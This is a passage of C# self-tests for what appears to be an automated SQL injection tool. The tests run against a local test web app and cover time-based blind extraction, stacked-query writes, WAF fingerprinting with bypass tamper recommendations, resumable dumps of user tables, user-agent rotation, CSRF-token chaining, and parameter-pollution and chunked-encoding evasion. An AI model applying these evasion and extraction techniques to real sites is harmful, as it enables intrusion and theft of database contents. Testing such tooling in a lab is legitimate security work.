    //B. 堆叠写操作验证：建表→插入→条件延时回证（数据真写入才延时）→删表
    await DataComm.RunStackedSql(config, sql.drop);
    await DataComm.RunStackedSql(config, sql.create);
    await DataComm.RunStackedSql(config, sql.insert);
    sw.Restart();
    await DataComm.RunStackedSql(config, sql.cond);
    sw.Stop();
    bool writeOk = sw.ElapsedMilliseconds >= sql.threshold;
    await DataComm.RunStackedSql(config, sql.drop);
    Console.WriteLine($"[stacked:{targetDb}] 堆叠写验证: 条件回证耗时{sw.ElapsedMilliseconds}ms → {(writeOk ? "PASS" : "FAIL")}");
    tags.Add(writeOk ? "写PASS" : "写FAIL");

    //C. 堆叠点取数回退验证：时间盲注读单字符字面量（'O'，hex通道读2字符"4F"）
    //Oracle/DM 的 SELECT 必须带 FROM DUAL（无FROM字面量select是语法错误，会静默判假导致hex解码崩溃）
    string expr = targetDb is "dm" or "oracle" ? "(select 'O' from dual)" : "(select 'O')";
    sw.Restart();
    string val;
    try
    {
        val = await DataComm.GetStringByStacked(config, expr, 8);
    }
    catch (Exception ex)
    {
        Console.WriteLine($"[stacked:{targetDb}] 取数回退验证: 异常 {ex.Message.Split('\n')[0]} → FAIL");
        val = "";
    }
    sw.Stop();
    bool readOk = val == "O";
    Console.WriteLine($"[stacked:{targetDb}] 取数回退验证: 读到'{val}'（耗时{sw.Elapsed.TotalSeconds:F1}s）→ {(readOk ? "PASS" : "FAIL")}");
    tags.Add(readOk ? "取数PASS" : "取数FAIL");

    return tags.Any(t => t.EndsWith("FAIL")) ? $"FAIL({string.Join(",", tags)})" : $"PASS({string.Join(",", tags)})";
}

// A5 WAF指纹识别自检：合成响应单测规则表 + /waf 端点端到端验证CheckWaf厂商识别
static async Task WafTest()
{
    Console.WriteLine("===== A5 WAF指纹识别自检 =====");
    var config = new AppConfig();
    int pass = 0, fail = 0;
    void Assert(bool ok, string name) { Console.WriteLine($"[{(ok ? "PASS" : "FAIL")}] {name}"); if (ok) pass++; else fail++; }

    //1.合成响应单测：Cloudflare被动（Server头+cf-ray）
    var cf = new HttpResponse(config);
    cf.HeaderTxt = "HTTP/1.1 200 OK\r\nServer: cloudflare\r\nCF-RAY: 8abc-SJC\r\nSet-Cookie: __cfduid=xyz\r\n\r\n";
    cf.Body = System.Text.Encoding.UTF8.GetBytes("hello");
    Assert(WafFingerprint.Vendors(WafFingerprint.Identify(cf, false)).Contains("Cloudflare"), "被动识别 Cloudflare（Server头）");

    //2.安全狗被动（Set-Cookie）
    var dog = new HttpResponse(config);
    dog.HeaderTxt = "HTTP/1.1 200 OK\r\nSet-Cookie: safedog-flow-item=9f2c1a\r\n\r\n";
    dog.Body = System.Text.Encoding.UTF8.GetBytes("normal page");
    Assert(WafFingerprint.Vendors(WafFingerprint.Identify(dog, false)).Contains("安全狗"), "被动识别 安全狗（Cookie）");

    //3.主动规则不误伤正常响应（ActiveOnly：正常页面含mod_security字样不算）
    var fp = new HttpResponse(config);
    fp.HeaderTxt = "HTTP/1.1 200 OK\r\nServer: nginx\r\n\r\n";
    fp.Body = System.Text.Encoding.UTF8.GetBytes("本站介绍mod_security的运维文章");
    Assert(WafFingerprint.Identify(fp, false).Count == 0, "ActiveOnly规则不命中正常响应（防误报）");

    //4.攻击响应命中主动规则
    Assert(WafFingerprint.Vendors(WafFingerprint.Identify(fp, true)).Contains("ModSecurity"), "主动识别 ModSecurity（攻击响应体）");

    //5.端到端：TestWebApp /waf 端点（被动Cookie=安全狗 + 攻击405）
    config.Host = "127.0.0.1"; config.Port = twaPort; config.IsSSL = false; config.TimeOut = 10; config.RetryCount = 1;
    Log.Sink = new LogTools { NotificationManager = null, TxtLog = null!, AppConfig = config };
    string reqTxt = $"GET /waf?id=1 HTTP/1.1\r\nHost: 127.0.0.1:{twaPort}\r\nConnection: close\r\n\r\n";
    var vendors = await InjectTools.CheckWaf(config, reqTxt, "id", "1");
    Console.WriteLine("CheckWaf识别结果: " + (vendors.Count > 0 ? string.Join("、", vendors) : "(无)"));
    Assert(vendors.Contains("安全狗"), "端到端 CheckWaf 识别 安全狗");

    //6.identywaf正则层：360拦截页标题（合成响应）
    var w360 = new HttpResponse(config);
    w360.HeaderTxt = "HTTP/1.1 403 Forbidden\r\nServer: nginx\r\n\r\n";
    w360.Body = System.Text.Encoding.UTF8.GetBytes("<html><head><title>493</title></head><body>blocked</body></html>");
    Assert(WafFingerprint.IdentifyByIdentYwaf(w360).Any(h => h.StartsWith("360")), "identywaf正则识别 360（拦截页标题）");

    //7.identywaf正则层：ModSecurity 拦截页文案（多分支正则）
    var modsec = new HttpResponse(config);
    modsec.HeaderTxt = "HTTP/1.1 406 Not Acceptable\r\n\r\n";
    modsec.Body = System.Text.Encoding.UTF8.GetBytes("This error was generated by Mod_Security.");
    Assert(WafFingerprint.IdentifyByIdentYwaf(modsec).Any(h => h.StartsWith("ModSecurity")), "identywaf正则识别 ModSecurity");

    //8.identywaf正则层不误报正常页面
    Assert(WafFingerprint.IdentifyByIdentYwaf(fp).Count == 0, "identywaf正则层不误报正常页面");

    //9.厂商→编码工具推荐：ModSecurity 首推 modsecurityversioned；未知厂商兜底三件套
    var rec1 = WafFingerprint.RecommendTampers(new List<string> { "ModSecurity(Trustwave)" });
    Assert(rec1.Count > 0 && rec1[0] == "modsecurityversioned", "ModSecurity推荐首推modsecurityversioned");
    var rec2 = WafFingerprint.RecommendTampers(new List<string> { "UnknownWaf" });
    Assert(rec2.Count == 3 && rec2[0] == "space2comment", "未知厂商兜底通用三件套");

    Console.WriteLine($"===== A5自检结果: PASS={pass} FAIL={fail} =====");
}

// P2-7 dump任务级断点续传自检：任务键/进度推进/落盘往返/完成清除/通道隔离
static void DumpResumeTest()
{
    Console.WriteLine("===== P2-7 dump断点续传自检 =====");
    int pass = 0, fail = 0;
    void Check(string name, bool ok, string detail = "")
    {
        Console.WriteLine($"[{(ok ? "PASS" : "FAIL")}] {name}{(detail.Length > 0 ? ": " + detail : "")}");
        if (ok) pass++; else fail++;
    }

    var config = new AppConfig();
    config.Host = "127.0.0.1";
    config.Port = twaPort;
    string cols = "id,name,pass";
    string key = DumpProgress.BuildKey(config, "Union", "testdb", "users", new List<string> { "id", "name", "pass" }, "");
    //先清残留，保证断言从干净状态开始
    DumpProgress.Complete(key);

    Check("初始无断点(-1)", DumpProgress.GetResumeIndex(key) == -1);

    DumpProgress.Save(key, 5);
    Check("进度保存后可读(5)", DumpProgress.GetResumeIndex(key) == 5);

    //落盘往返：首次Save越过节流（_lastSaveTicks初值0）立即写盘
    DumpProgress.Flush();
    string file = System.IO.Path.Combine("config", "sessions", "dump_progress.json");
    bool fileOk = System.IO.File.Exists(file) && System.IO.File.ReadAllText(file).Contains(":5");
    Check("断点落盘且含进度值", fileOk);

    //通道隔离：同表不同通道互不影响
    string keyBlind = DumpProgress.BuildKey(config, "Bool", "testdb", "users", new List<string> { "id", "name", "pass" }, "");
    Check("通道隔离（Bool通道无断点）", DumpProgress.GetResumeIndex(keyBlind) == -1);

    //where/列变化→任务键变化（防串档）
    string keyOther = DumpProgress.BuildKey(config, "Union", "testdb", "users", new List<string> { "id", "name" }, "");
    Check("列变化任务键不同", keyOther != key);
    string keyWhere = DumpProgress.BuildKey(config, "Union", "testdb", "users", new List<string> { "id", "name", "pass" }, "id>10");
    Check("where变化任务键不同", keyWhere != key);

    DumpProgress.Complete(key);
    Check("完成后断点清除", DumpProgress.GetResumeIndex(key) == -1);
    bool cleared = !System.IO.File.Exists(file) || !System.IO.File.ReadAllText(file).Contains("testdb");
    Check("完成后落盘同步清除", cleared);

    Console.WriteLine($"===== P2-7自检结果: PASS={pass} FAIL={fail} =====");
}

// A4断点续跑自检：盲注进度缓存的写入/持久化/续取/完成清除
static void SessionTest()
{
    Console.WriteLine("===== A4 断点续跑自检 =====");
    DataComm.ClearBlindProgress();
    string payload = "(select version())";

    //模拟中断：缓存里写入已取前缀（模拟上次中断时保存）
    //通过反射调私有方法太重，直接验证公开API语义：
    //1. 无断点时前缀为空
    bool ok1 = DataComm.GetBlindProgressPrefix(payload) == "";
    Console.WriteLine($"[{(ok1 ? "PASS" : "FAIL")}] 初始无断点");

    //2. 手工写入断点文件，验证跨进程加载（静态构造只跑一次，这里验证文件读写路径存在）
    string dir = "config/sessions";
    System.IO.Directory.CreateDirectory(dir);
    string file = System.IO.Path.Combine(dir, "blind_progress.json");
    bool ok2 = true;
    try
    {
        var dic = new Dictionary<string, string> { [payload] = "382e302e" };
        System.IO.File.WriteAllText(file, System.Text.Json.JsonSerializer.Serialize(dic));
        var back = System.Text.Json.JsonSerializer.Deserialize<Dictionary<string, string>>(System.IO.File.ReadAllText(file));
        ok2 = back != null && back.TryGetValue(payload, out var v) && v == "382e302e";
    }
    catch { ok2 = false; }
    Console.WriteLine($"[{(ok2 ? "PASS" : "FAIL")}] 断点文件读写往返");

    //3. 注入记录（InjectRecord）序列化往返（检测会话持久化）
    var rec = new InjectRecord
    {
        Target = $"127.0.0.1:{twaPort}",
        PName = "id",
        DBType = DBType.MySQL,
        InjectType = InjectType.Union,
        SumColumnCount = 4,
        ShowColumnIndex = 1,
        Place = ParamPlace.Cookie,
        HeaderName = "",
        RequestTxt = "GET /x HTTP/1.1\r\n\r\n"
    };
    string json = System.Text.Json.JsonSerializer.Serialize(rec);
    var rec2 = System.Text.Json.JsonSerializer.Deserialize<InjectRecord>(json);
    bool ok3 = rec2 != null && rec2.Place == ParamPlace.Cookie && rec2.SumColumnCount == 4 && rec2.RequestTxt == rec.RequestTxt;
    Console.WriteLine($"[{(ok3 ? "PASS" : "FAIL")}] 注入记录序列化往返（Place/Cookie字段保留）");

    int pass = (ok1 ? 1 : 0) + (ok2 ? 1 : 0) + (ok3 ? 1 : 0);
    Console.WriteLine($"===== A4自检结果: PASS={pass} FAIL={3 - pass} =====");
}

// A8频率控制+随机UA自检（请求TestWebApp首页静态页，不依赖数据库容器）
static void FreqTest()
{
    Console.WriteLine("===== A8 频率控制+随机UA自检 =====");
    var config = new AppConfig();
    config.Host = "127.0.0.1";
    config.Port = twaPort;
    config.IsSSL = false;
    config.TimeOut = 15;
    config.RetryCount = 1;
    string reqTxt =
        "GET /ping HTTP/1.1\r\n" +
        $"Host: 127.0.0.1:{config.Port}\r\n" +
        "User-Agent: SuperSQLInjectionV2-TestHarness\r\n" +
        "Connection: close\r\n\r\n";

    //1. 固定延时：DelayMs=200，连发3个请求，总耗时应>=600ms
    config.ByPassConfig.DelayMs = 200;
    var codes = new List<int>();
    var sw = System.Diagnostics.Stopwatch.StartNew();
    for (int i = 0; i < 3; i++)
    {
        codes.Add(HTTPTool.sendRequestRetry(new HttpRequest(config, reqTxt)).StatusCode);
    }
    sw.Stop();
    bool ok1 = sw.ElapsedMilliseconds >= 590 && codes.All(c => c == 200);
    Console.WriteLine($"[{(ok1 ? "PASS" : "FAIL")}] 固定延时200ms×3，实际耗时={sw.ElapsedMilliseconds}ms");
    config.ByPassConfig.DelayMs = 0;

    //2. 随机UA：请求/echo-ua回显端点，服务端看到的UA应来自内置池且与原始UA不同
    config.ByPassConfig.RandomUa = true;
    string uaReqTxt = reqTxt.Replace("GET /ping", "GET /echo-ua");
    var uas = new HashSet<string>();
    for (int i = 0; i < 3; i++)
    {
        var resp = HTTPTool.sendRequestRetry(new HttpRequest(config, uaReqTxt));
        string ua = (resp.BodyTxt ?? "").Trim();
        if (!string.IsNullOrEmpty(ua)) uas.Add(ua);
    }
    bool ok2 = uas.Count >= 1 && !uas.Contains("SuperSQLInjectionV2-TestHarness") && uas.All(u => u.StartsWith("Mozilla/5.0"));
    Console.WriteLine($"[{(ok2 ? "PASS" : "FAIL")}] 随机UA替换（采集到{uas.Count}种UA: {string.Join(" | ", uas.Take(2))}...）");
    config.ByPassConfig.RandomUa = false;

    //3. 限速：SafeFreq=5（间隔200ms），3个请求总耗时应>=400ms
    config.ByPassConfig.SafeFreq = 5;
    var codes2 = new List<int>();
    sw.Restart();
    for (int i = 0; i < 3; i++)
    {
        codes2.Add(HTTPTool.sendRequestRetry(new HttpRequest(config, reqTxt)).StatusCode);
    }
    sw.Stop();
    bool ok3 = sw.ElapsedMilliseconds >= 390 && codes2.All(c => c == 200);
    Console.WriteLine($"[{(ok3 ? "PASS" : "FAIL")}] 限速5req/s×3，实际耗时={sw.ElapsedMilliseconds}ms");
    config.ByPassConfig.SafeFreq = 0;

    int pass = (ok1 ? 1 : 0) + (ok2 ? 1 : 0) + (ok3 ? 1 : 0);
    Console.WriteLine($"===== A8自检结果: PASS={pass} FAIL={3 - pass} =====");
}

// A9 CSRF token联动 + A11 脚本计算动态值 自检（不依赖数据库容器）
static AppConfig NewTwaConfig()
{
    var c = new AppConfig();
    c.Host = "127.0.0.1";
    c.Port = twaPort;
    c.IsSSL = false;
    c.TimeOut = 15;
    c.RetryCount = 1;
    return c;
}

static CompanionRequestConfig AddRule(AppConfig c, int kind, bool enabled = true)
{
    var r = new CompanionRequestConfig { Kind = kind, Enabled = enabled, Name = kind == 0 ? "前置·随机值抓取" : "后置·二次注入取数" };
    c.CompanionRules.Add(r);
    return r;
}

// A9 CSRF token联动 + A11 脚本计算动态值 自检（不依赖数据库容器）
static void CsrfTest()
{
    Console.WriteLine("===== A9/A11 Token联动自检 =====");
    var config = NewTwaConfig();

    //1. A9页面抓取：每个请求先从/token-page取最新token再发到/csrf-check，应返回OK（旧token返回FAIL）
    var before = AddRule(config, 0);
    before.RequestTxt =
        "GET /token-page HTTP/1.1\r\n" +
        $"Host: 127.0.0.1:{config.Port}\r\n" +
        "User-Agent: SuperSQLInjectionV2-TestHarness\r\n" +
        "Connection: close\r\n\r\n";
    before.SubStart = "value=\"";
    before.SubEnd = "\">";
    string checkReq =
        "GET /csrf-check?csrf=<DRule><DRule> HTTP/1.1\r\n" +
        $"Host: 127.0.0.1:{config.Port}\r\n" +
        "User-Agent: SuperSQLInjectionV2-TestHarness\r\n" +
        "Connection: close\r\n\r\n";
    var r1 = HTTPTool.sendRequestRetry(new HttpRequest(config, checkReq));
    var r2 = HTTPTool.sendRequestRetry(new HttpRequest(config, checkReq));
    bool ok1 = r1.BodyTxt?.Trim() == "OK" && r2.BodyTxt?.Trim() == "OK";
    Console.WriteLine($"[{(ok1 ? "PASS" : "FAIL")}] A9 页面抓取token每请求刷新（两次响应: {r1.BodyTxt?.Trim()}/{r2.BodyTxt?.Trim()}）");

    //2. 脚本提取：脚本输入为抓取请求返回的完整HTTP响应报文（头+body），从响应中解析token
    before.UseScript = true;
    config.TokenScripts.Add(new ScriptTamperModel
    {
        Name = "t",
        Lang = SuperSQLInjectionV2.Bypass.ScriptLang.JavaScript,
        Code = "function tamper(response){ var m = response.match(/value=\"(tok-[0-9a-f]+)/); return m ? m[1] : ''; }",
        Enable = true
    });
    before.ScriptName = "t";
    BypassPipeline.ResetTokenCache(config);
    var r3 = HTTPTool.sendRequestRetry(new HttpRequest(config, checkReq));
    var r4 = HTTPTool.sendRequestRetry(new HttpRequest(config, checkReq));
    bool ok2 = r3.BodyTxt?.Trim() == "OK" && r4.BodyTxt?.Trim() == "OK";
    Console.WriteLine($"[{(ok2 ? "PASS" : "FAIL")}] 脚本提取token（响应报文输入，两次响应: {r3.BodyTxt?.Trim()}/{r4.BodyTxt?.Trim()}）");

    //3. URL请求来源（SourceMode=1，GET）：不粘贴报文，直接URL+方式抓取
    var config3 = NewTwaConfig();
    var before3 = AddRule(config3, 0);
    before3.SourceMode = 1;
    before3.Url = $"http://127.0.0.1:{twaPort}/token-page";
    before3.Method = "GET";
    before3.SubStart = "value=\"";
    before3.SubEnd = "\">";
    string checkReq3 =
        "GET /csrf-check?csrf=<DRule><DRule> HTTP/1.1\r\n" +
        $"Host: 127.0.0.1:{config3.Port}\r\n" +
        "User-Agent: SuperSQLInjectionV2-TestHarness\r\n" +
        "Connection: close\r\n\r\n";
    var r5 = HTTPTool.sendRequestRetry(new HttpRequest(config3, checkReq3));
    var r6 = HTTPTool.sendRequestRetry(new HttpRequest(config3, checkReq3));
    bool ok3 = r5.BodyTxt?.Trim() == "OK" && r6.BodyTxt?.Trim() == "OK";
    Console.WriteLine($"[{(ok3 ? "PASS" : "FAIL")}] URL来源抓取token（两次响应: {r5.BodyTxt?.Trim()}/{r6.BodyTxt?.Trim()}）");

    //4. 后置伴随请求（二次注入取数）：主请求用<Rand>，后置页请求/echo-q?x=<Rand>响应替代主响应，且x与主流随机值同流配对
    var config4 = NewTwaConfig();
    var after4 = AddRule(config4, 1);
    after4.RequestTxt =
        "GET /echo-q?x=<Rand></Rand> HTTP/1.1\r\n" +
        $"Host: 127.0.0.1:{config4.Port}\r\n" +
        "User-Agent: SuperSQLInjectionV2-TestHarness\r\n" +
        "Connection: close\r\n\r\n";
    string mainReq4 =
        "GET /echo-q?x=<Rand></Rand> HTTP/1.1\r\n" +
        $"Host: 127.0.0.1:{config4.Port}\r\n" +
        "User-Agent: SuperSQLInjectionV2-TestHarness\r\n" +
        "Connection: close\r\n\r\n";
    var r7 = HTTPTool.sendRequestRetry(new HttpRequest(config4, mainReq4));
    var r8 = HTTPTool.sendRequestRetry(new HttpRequest(config4, mainReq4));
    //响应已被后置页替代（body=32位hex随机值而非原主响应）；同报文Rand缓存复用，两次值一致即配对成功
    bool ok4 = r7.BodyTxt?.Trim().Length == 32 && r7.BodyTxt == r8.BodyTxt && r7.BodyTxt != "pong";
    Console.WriteLine($"[{(ok4 ? "PASS" : "FAIL")}] 后置伴随请求响应替代+Rand同流配对（两次响应: {r7.BodyTxt?.Trim()}/{r8.BodyTxt?.Trim()}）");

    //5. 多线程配对：8个线程并发，主流与后置流随机值不得交错（FlowRand按请求流配对）
    int threadOk = 0;
    Parallel.For(0, 8, i =>
    {
        var cfgT = NewTwaConfig();
        var afterT = AddRule(cfgT, 1);
        //后置页回显<Rand>配对值；若配对错乱（拿到别的请求的Rand），body与主流使用的Rand不一致
        afterT.RequestTxt =
            "GET /echo-q?x=<Rand></Rand> HTTP/1.1\r\n" +
            $"Host: 127.0.0.1:{cfgT.Port}\r\n" +
            "User-Agent: SuperSQLInjectionV2-TestHarness\r\n" +
            "Connection: close\r\n\r\n";
        string mainT =
            "GET /echo-q?x=<Rand></Rand> HTTP/1.1\r\n" +
            $"Host: 127.0.0.1:{cfgT.Port}\r\n" +
            "User-Agent: SuperSQLInjectionV2-TestHarness\r\n" +
            "Connection: close\r\n\r\n";
        //同一线程内：先不带后置取主流<Rand>实际值，再带后置取配对值——配对正确时二者必等；
        //若FlowRand丢失退化为全局LastRand，并发下大概率拿到其他线程的随机值导致不等
        afterT.Enabled = false;
        var rMain = HTTPTool.sendRequestRetry(new HttpRequest(cfgT, mainT));
        afterT.Enabled = true;
        var rPair = HTTPTool.sendRequestRetry(new HttpRequest(cfgT, mainT));
        if (rPair.BodyTxt?.Trim() == rMain.BodyTxt?.Trim() && rMain.BodyTxt?.Trim().Length == 32)
        {
            Interlocked.Increment(ref threadOk);
        }
    });
    bool ok5 = threadOk == 8;
    Console.WriteLine($"[{(ok5 ? "PASS" : "FAIL")}] 多线程FlowRand配对（{threadOk}/8 线程主流与后置流随机值一致）");

    //6. 后置URL来源（SourceMode=1，GET）：不粘贴报文，后置页按URL+请求方式构造，<Rand>经URL查询串同流配对
    var config6 = NewTwaConfig();
    var after6 = AddRule(config6, 1, enabled: false);
    after6.SourceMode = 1;
    after6.Url = $"http://127.0.0.1:{twaPort}/echo-q?x=<Rand></Rand>";
    after6.Method = "GET";
    string mainReq6 =
        "GET /echo-q?x=<Rand></Rand> HTTP/1.1\r\n" +
        $"Host: 127.0.0.1:{config6.Port}\r\n" +
        "User-Agent: SuperSQLInjectionV2-TestHarness\r\n" +
        "Connection: close\r\n\r\n";
    var rMain6 = HTTPTool.sendRequestRetry(new HttpRequest(config6, mainReq6));
    after6.Enabled = true;
    var rPair6 = HTTPTool.sendRequestRetry(new HttpRequest(config6, mainReq6));
    bool ok6 = rPair6.BodyTxt?.Trim() == rMain6.BodyTxt?.Trim() && rMain6.BodyTxt?.Trim().Length == 32;
    Console.WriteLine($"[{(ok6 ? "PASS" : "FAIL")}] 后置URL来源+Rand同流配对（主流: {rMain6.BodyTxt?.Trim()} / 后置: {rPair6.BodyTxt?.Trim()}）");

    //7. 前置命名标记：<DRule>tok2<DRule>按标记名关联规则抓取；<DRule>nope<DRule>无对应规则不替换，csrf校验失败
    var config7 = NewTwaConfig();
    var before7 = AddRule(config7, 0);
    before7.TagName = "tok2";
    before7.RequestTxt =
        "GET /token-page HTTP/1.1\r\n" +
        $"Host: 127.0.0.1:{config7.Port}\r\n" +
        "User-Agent: SuperSQLInjectionV2-TestHarness\r\n" +
        "Connection: close\r\n\r\n";
    before7.SubStart = "value=\"";
    before7.SubEnd = "\">";
    string namedReq =
        "GET /csrf-check?csrf=<DRule>tok2<DRule> HTTP/1.1\r\n" +
        $"Host: 127.0.0.1:{config7.Port}\r\n" +
        "User-Agent: SuperSQLInjectionV2-TestHarness\r\n" +
        "Connection: close\r\n\r\n";
    var r9 = HTTPTool.sendRequestRetry(new HttpRequest(config7, namedReq));
    var r10 = HTTPTool.sendRequestRetry(new HttpRequest(config7, namedReq));
    string unknownReq =
        "GET /csrf-check?csrf=<DRule>nope<DRule> HTTP/1.1\r\n" +
        $"Host: 127.0.0.1:{config7.Port}\r\n" +
        "User-Agent: SuperSQLInjectionV2-TestHarness\r\n" +
        "Connection: close\r\n\r\n";
    var r11 = HTTPTool.sendRequestRetry(new HttpRequest(config7, unknownReq));
    bool ok7 = r9.BodyTxt?.Trim() == "OK" && r10.BodyTxt?.Trim() == "OK" && r11.BodyTxt?.Trim() != "OK";
    Console.WriteLine($"[{(ok7 ? "PASS" : "FAIL")}] 前置命名标记DRule:tok2关联（tok2两次: {r9.BodyTxt?.Trim()}/{r10.BodyTxt?.Trim()}，nope不替换: {r11.BodyTxt?.Trim()}）");

    //8. 后置命名标记：两条后置规则s1/s2，<Sencond:s2>指令剔除并关联s2规则取数
    var config8 = NewTwaConfig();
    var after8a = AddRule(config8, 1);
    after8a.TagName = "s1";
    after8a.RequestTxt =
        "GET /ping HTTP/1.1\r\n" +
        $"Host: 127.0.0.1:{config8.Port}\r\n" +
        "User-Agent: SuperSQLInjectionV2-TestHarness\r\n" +
        "Connection: close\r\n\r\n";
    var after8b = AddRule(config8, 1);
    after8b.TagName = "s2";
    after8b.RequestTxt =
        "GET /echo-q?x=<Rand></Rand> HTTP/1.1\r\n" +
        $"Host: 127.0.0.1:{config8.Port}\r\n" +
        "User-Agent: SuperSQLInjectionV2-TestHarness\r\n" +
        "Connection: close\r\n\r\n";
    string mainReq8 =
        "GET /echo-q?x=<Rand></Rand><Sencond:s2></Sencond> HTTP/1.1\r\n" +
        $"Host: 127.0.0.1:{config8.Port}\r\n" +
        "User-Agent: SuperSQLInjectionV2-TestHarness\r\n" +
        "Connection: close\r\n\r\n";
    var r12 = HTTPTool.sendRequestRetry(new HttpRequest(config8, mainReq8));
    //指令被剔除且命中s2规则：响应被s2后置页替代（body=32位hex而非s1的pong），且与主流Rand同流配对
    string mainReq8NoAfter = mainReq8.Replace("<Sencond:s2></Sencond>", "");
    after8a.Enabled = false;
    after8b.Enabled = false;
    var rMain8 = HTTPTool.sendRequestRetry(new HttpRequest(config8, mainReq8NoAfter));
    after8b.Enabled = true;
    var rPair8 = HTTPTool.sendRequestRetry(new HttpRequest(config8, mainReq8));
    bool ok8 = r12.BodyTxt?.Trim().Length == 32 && r12.BodyTxt != "pong"
        && rPair8.BodyTxt?.Trim() == rMain8.BodyTxt?.Trim();
    Console.WriteLine($"[{(ok8 ? "PASS" : "FAIL")}] 后置命名标记Sencond:s2关联（替代响应: {r12.BodyTxt?.Trim()}，配对: {rMain8.BodyTxt?.Trim()}/{rPair8.BodyTxt?.Trim()}）");

    //9. 动态值脚本生成（SourceMode=2）：不发HTTP抓取请求，脚本输入为主请求报文，输出即为动态值（API签名场景）
    var config9 = NewTwaConfig();
    var gen9 = AddRule(config9, 0);
    gen9.TagName = "sig";
    gen9.SourceMode = 2;
    config9.TokenScripts.Add(new ScriptTamperModel
    {
        Name = "g",
        Lang = SuperSQLInjectionV2.Bypass.ScriptLang.JavaScript,
        Code = "function tamper(req){ return req.indexOf('echo-q') >= 0 ? 'sig-ok' : 'sig-bad'; }",
        Enable = true
    });
    gen9.ScriptName = "g";
    string sigReq =
        "GET /echo-q?x=<DRule>sig<DRule> HTTP/1.1\r\n" +
        $"Host: 127.0.0.1:{config9.Port}\r\n" +
        "User-Agent: SuperSQLInjectionV2-TestHarness\r\n" +
        "Connection: close\r\n\r\n";
    var r13 = HTTPTool.sendRequestRetry(new HttpRequest(config9, sigReq));
    //脚本收到主请求报文（含echo-q）→ 返回sig-ok回填，echo-q原样回显
    bool ok9 = r13.BodyTxt?.Trim() == "sig-ok";
    Console.WriteLine($"[{(ok9 ? "PASS" : "FAIL")}] 动态值脚本生成（主请求报文输入，回显: {r13.BodyTxt?.Trim()}）");

    //10. 二次注入单开强制：新增/启用任一二次注入规则时自动关闭其余；动态值规则不受限
    var config10 = NewTwaConfig();
    var a1 = AddRule(config10, 1);
    var a2 = AddRule(config10, 1);
    bool single1 = !a1.Enabled && a2.Enabled;
    a1.Enabled = true;
    bool single2 = a1.Enabled && !a2.Enabled;
    var b1 = AddRule(config10, 0);
    var b2 = AddRule(config10, 0);
    bool multiBefore = b1.Enabled && b2.Enabled;
    bool ok10 = single1 && single2 && multiBefore;
    Console.WriteLine($"[{(ok10 ? "PASS" : "FAIL")}] 二次注入单开强制（新增压制: {single1}，启用压制: {single2}，动态值多开: {multiBefore}）");

    int pass = (ok1 ? 1 : 0) + (ok2 ? 1 : 0) + (ok3 ? 1 : 0) + (ok4 ? 1 : 0) + (ok5 ? 1 : 0) + (ok6 ? 1 : 0) + (ok7 ? 1 : 0) + (ok8 ? 1 : 0) + (ok9 ? 1 : 0) + (ok10 ? 1 : 0);
    Console.WriteLine($"===== A9/A11自检结果: PASS={pass} FAIL={10 - pass} =====");
}

// A10 HPP参数污染 + chunked分块发包 自检（不依赖数据库容器）
static void HppTest()
{
    Console.WriteLine("===== A10 HPP/chunked自检 =====");
    var config = new AppConfig();
    config.Host = "127.0.0.1";
    config.Port = twaPort;
    config.IsSSL = false;
    config.TimeOut = 15;
    config.RetryCount = 1;

    //1. HPP：参数x值含%20被拆成多个同名参数，ASP.NET收到后以逗号连接
    config.DataConfig.InjectParamName = "x";
    config.ByPassConfig.HppEnabled = true;
    string hppReq =
        "GET /echo-q?x=hello%20world%20sqli HTTP/1.1\r\n" +
        $"Host: 127.0.0.1:{config.Port}\r\n" +
        "User-Agent: SuperSQLInjectionV2-TestHarness\r\n" +
        "Connection: close\r\n\r\n";
    var r1 = HTTPTool.sendRequestRetry(new HttpRequest(config, hppReq));
    bool ok1 = r1.BodyTxt?.Trim() == "hello,world,sqli";
    Console.WriteLine($"[{(ok1 ? "PASS" : "FAIL")}] HPP参数污染拆分（服务端收到: {r1.BodyTxt?.Trim()}）");
    config.ByPassConfig.HppEnabled = false;

    //2. chunked：POST体按Transfer-Encoding: chunked发送，服务端应正确解码出原始body
    config.ByPassConfig.ChunkedEnabled = true;
    string body = "hello chunked body 你好";
    string chunkReq =
        "POST /echo-body HTTP/1.1\r\n" +
        $"Host: 127.0.0.1:{config.Port}\r\n" +
        "User-Agent: SuperSQLInjectionV2-TestHarness\r\n" +
        "Content-Type: text/plain\r\n" +
        $"Content-Length: {System.Text.Encoding.UTF8.GetByteCount(body)}\r\n" +
        "Connection: close\r\n\r\n" + body;
    var r2 = HTTPTool.sendRequestRetry(new HttpRequest(config, chunkReq));
    bool ok2 = r2.BodyTxt == body;
    Console.WriteLine($"[{(ok2 ? "PASS" : "FAIL")}] chunked分块发包（服务端解出: {r2.BodyTxt}）");
    config.ByPassConfig.ChunkedEnabled = false;

    int pass = (ok1 ? 1 : 0) + (ok2 ? 1 : 0);
    Console.WriteLine($"===== A10自检结果: PASS={pass} FAIL={2 - pass} =====");
}

// P0 检测前置剥标记自检：人工/自动标记报文还原为干净报文，标记符号不混入参数值
static void StripTest()
{
    Console.WriteLine("===== P0 剥标记自检 =====");
    int pass = 0, fail = 0;

    //干净报文：原样返回（长度不变，检测入口据此判断是否提示）
    string clean = "GET /a?id=1 HTTP/1.1\r\nHost: x\r\n\r\n";
    bool ok1 = RequestRewriter.StripRequestMarks(clean) == clean;
    Console.WriteLine($"[{(ok1 ? "PASS" : "FAIL")}] 干净报文原样返回");
    if (ok1) pass++; else fail++;

    //裸$sql$：删除
    bool ok2 = RequestRewriter.StripRequestMarks("GET /a?id=1$sql$ HTTP/1.1") == "GET /a?id=1 HTTP/1.1";
    Console.WriteLine($"[{(ok2 ? "PASS" : "FAIL")}] 裸$sql$删除");
    if (ok2) pass++; else fail++;

    //Encode块：保留内部内容（内部$sql$也被删除）
    bool ok3 = RequestRewriter.StripRequestMarks("GET /a?id=<Encode>1 and $sql$#</Encode> HTTP/1.1") == "GET /a?id=1 and # HTTP/1.1";
    Console.WriteLine($"[{(ok3 ? "PASS" : "FAIL")}] <Encode>块保留内容+$sql$删除");
    if (ok3) pass++; else fail++;

    //EncodeRaw/Rand/DRule块：保留内部内容
    bool ok4 = RequestRewriter.StripRequestMarks("Cookie: sid=<EncodeRaw>ab$sql$</EncodeRaw>; t=<Rand>r1</Rand>; k=<DRule>tok:tk<DRule>")
        == "Cookie: sid=ab; t=r1; k=tk";
    Console.WriteLine($"[{(ok4 ? "PASS" : "FAIL")}] EncodeRaw/Rand/DRule块剥离");
    if (ok4) pass++; else fail++;

    //未闭合标记残余：清除到行尾（与SyncUrlFromRecord的剥离规则一致，不影响下一行）
